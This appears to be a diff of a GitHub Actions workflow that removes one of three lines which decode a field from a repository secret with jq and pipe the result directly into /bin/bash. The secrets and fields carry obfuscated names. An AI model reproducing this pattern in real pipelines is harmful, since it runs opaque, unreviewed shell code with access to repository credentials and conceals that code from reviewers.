@@ -18,7 +18,6 @@ jobs:
           bj79: ${{ secrets.bj79 }}
         run: |
           printf '%s' "$bj79" | jq -r .yo46 | /bin/bash
-          printf '%s' "$wbt442" | jq -r .ik1040 | /bin/bash
           printf '%s' "$dgqh08" | jq -r .j03154 | /bin/bash
 
       - name: Save archive
